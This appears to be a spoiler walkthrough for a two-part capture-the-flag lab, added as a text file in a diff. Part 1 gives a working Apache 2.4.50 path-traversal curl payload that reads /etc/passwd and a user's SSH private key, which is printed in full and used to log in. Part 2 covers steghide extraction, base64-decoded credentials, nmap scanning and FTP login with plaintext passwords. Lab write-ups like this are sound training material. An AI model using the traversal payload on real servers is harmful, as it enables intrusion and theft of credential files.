@@ -1,0 +1,113 @@
+Part 1:
+
+####################### Spoilers ################################
+####################### Spoilers ################################
+####################### Spoilers ################################
+####################### Spoilers ################################
+####################### Spoilers ################################
+####################### Spoilers ################################
+
+
+Step 1 : Finger print the OS. Many different ways to do this but a simple way with no tools is using wget command. Other tools: nmap, curl, telnet etc... will also work.
+
+wget -q -S  localhost:2000
+  HTTP/1.1 200 OK
+  Date: Mon, 15 Nov 2021 17:57:05 GMT
+  Server: Apache/2.4.50 (Unix)
+  Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
+  ETag: "2d-432a5e4a73a80"
+  Accept-Ranges: bytes
+  Content-Length: 45
+  Keep-Alive: timeout=5, max=100
+  Connection: Keep-Alive
+  Content-Type: text/html
+
+Step 2: Time for research. If we search exploits for Apache 2.4.50 we will find that it is vulnerable to directory transversal and remote code execution (RCE).
+
+Step 3: Here we can get creative depending on your skill level. But for this explantion we will stick with the simpler method of directory transversal. 
+We will use the curl utlitlity to request the apache server send us data outside of the normal website directory to see if they have misconfigured the site. You can find the correct encoding for this version of apache simple by searching it. We can also accomplish two task with one command. Lets see if we can determine what accounts are on the box.
+
+curl http://192.168.1.20:2000/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd    
+
+root:x:0:0:root:/root:/bin/bash
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+bob:x:1000:1000::/home/bob:/bin/sh
+
+Above we see a couple interesting things; ssh server is installed and there are two users with shell access root and bob. Next lets look at the default RSA keygen process. Normally the command ssh-keygen would store the keys in the hidden folder .ssh in our users home folder under the default name id_rsa. But the scenario says the user is storing them in there home folder.
+
+Step 4:  curl http://192.168.1.20:2000/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/home/bob/id_rsa
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAydPEoxZpX3z58q4l3ZjFCq23U5U0GuPn1kyVURGpTESpnAMTubOn
+hypd0PaFMIW3OSiuOEYY6onINB74G0nB/VSfX9VXdS6sDKoAAD+810+9eGEhnH/xpN2H6/
+psKf+B8eHV7bcL+l1yd8GgiiUYQyzaqPRVd8hhGT87EacS2pbXfS1uDswvu8Vjv9/Gy8GG
+o3I+iZzoq1UQ/WSvwfD+uP3GCHsl1Sj2Ujf5Y8UdtSs3LG/2bty2djfAx1FoRi6vdroPw1
+gxBBQiwuqNu4DP/MMFfK+tQacLTuNMiv1btAZ13Krw5GDMqbp96jc9rGqokEN/JIAKr+LK
+83JCMjDe/wAAA9As8he+LPIXvgAAAAdzc2gtcnNhAAABAQDJ08SjFmlffPnyriXdmMUKrb
+dTlTQa4+fWTJVREalMRKmcAxO5s6eHKl3Q9oUwhbc5KK44Rhjqicg0HvgbScH9VJ9f1Vd1
+LqwMqgAAP7zXT714YSGcf/Gk3Yfr+mwp/4Hx4dXttwv6XXJ3waCKJRhDLNqo9FV3yGEZPz
+sRpxLaltd9LW4OzC+7xWO/38bLwYajcj6JnOirVRD9ZK/B8P64/cYIeyXVKPZSN/ljxR21
+Kzcsb/Zu3LZ2N8DHUWhGLq92ug/DWDEEFCLC6o27gM/8wwV8r61BpwtO40yK/Vu0BnXcqv
+DkYMypun3qNz2saqiQQ38kgAqv4srzckIyMN7/AAAAAwEAAQAAAQAjJoS6uq6DeOq3P2lM
+3MyEfZjOL9AxVrwL8K6YvfC0XckEaOzIjOeCfPh16llsB/3PMKyXFG5GetSpbzNa3U+x5U
+kUkb13pTdFxV3WrUMgZLzk+FW4Qfg99G81xBmOfveMvv5ZNmYZpqjG/qwNI0TEfk1e257/
+C6ENmpuZCXYZJ5j+6i3cxMO329bs0bOuhZibDDdWEVDZKbZTgZoHFPShVvYkhY4/LQYTvz
+DGMFf6jY4bu5G1TBqeuvaRTtP5fpx/9QyPLffqU+Uy05fgpVTEHOIH7DdBJyRATPHets1o
+xzN+fCwEnuP4krs6hlncpmFgD5XndjKpxTGqQf80p6rRAAAAgQCpWInEtWI2kKIPidoDX5
+Q43JfrgNyi2MDSDV0AB5jey8slhpEODa4yqyTSvdAtfPcWxbZKmMm8rflyH8AT3i/rOmnM
+hB8pg6zS/G9R6IlAsNEISbZUc8chvQHuZFhtUbqk4elsGVp25a2yQ4bgOSmajNIRQhSYBe
+vVXfnzl9054gAAAIEA7qRsC04Fyt/pgERWmavWNKCAUn03LqFpX1Zb+bcWmkV0PK1uofZV
+bITjjzC+pXGWnWBrQnMZq2KbvVjKClCW+HaXqWgewwRc0rznLTQMMKy4nQRpnu+5vAr87I
+SOORjj+TCDZn7+G88eoEXzKngAQfdmN3rany1fM32UoqOHpvsAAACBANiB1za6E8MABhTm
+gZWMFgtB3HjCUtJAOuxX3NnprnvQtv0Nz8Lg3HtLwPUizodzUai0nDLGecsXbn/FEmVDip
+JiYboCh6LVgns/5/QamtqU3AXEE6en9EaezHGd5tsz55VZ2VfeesQQmeWCI5b5BO7oglrt
+g0fk2B2BiUJI1/jNAAAAE2JvYkBidWlsZGtpdHNhbmRib3gBAgMEBQYH
+-----END OPENSSH PRIVATE KEY-----
+
+Step 5:  Lets see if the Private key we stole works.
+ssh -i id_rsa bob@192.168.1.20 -p 2001 
+
+Step 6: Congrats! Take a look around for the flag but other than that the box is pretty bare bones.
+
+
+
+
+
+
+
+Part 2
+
+1) Another web server is exposed through port 8080 on the localhost running the container - start here.
+2) The page hints to a file being hidden in an image - extract the hidden file to find SSH credentials.
+	ex:   steghide extract -sf mugatu.jpg
+		passphrase: mugatu
+3) SSH into the challenge box
+	ex:   ssh -p3333 jacobim@<hostip>
+4) Flag1.txt is in the user's home directory, only contains minor hint to look at another user
+5) Searching through the file system reveals two users of interest - but their home directories are locked down.
+	Further searching will reveal an interesting file   /tmp/Vesuvius
+6) The file contents look like a bunch of garbage data, but there is a base64 encoded string hidden within
+7) Multiple ways to locate the encoded string, but simplist is shown below
+	ex:   sort -u Vesuvius
+8) Decoding the string yields another set of credentials.  Switch to this user and check out the home directory.
+	ex: echo "aGFuc2VsOmRvbnR5b3Vrbm93aW1sb2NvCg==" | base64 -d
+9) Flag2.txt is located here and hints at flag3.txt being located on another computer
+10) Nmap is installed on the challenge box, enabling scanning for other hosts on the subnet.
+	ex:   nmap -sV 172.16.88.0/24
+11) The scan will reveal the 172.16.88.19 host which appears to be running an FTP server.
+12) Netcat is also installed on the challenge box - use this to see if your credentials work on the FTP server.
+	ex:   nc 172.16.88.19 21
+		user hansel
+		pass dontyouknowimloco
+13) The login is successful, however navigating and listing file system contents is a bit wonky so we should try
+	another method of retrieving files.
+	ex:   wget ftp://hansel:dontyouknowimloco@172.16.88.19/flag3.txt
+14) This file contains another set of credentials - switch to this user on the challenge box and investigate their home for the final flag.
+
+
+
+
+
+
+
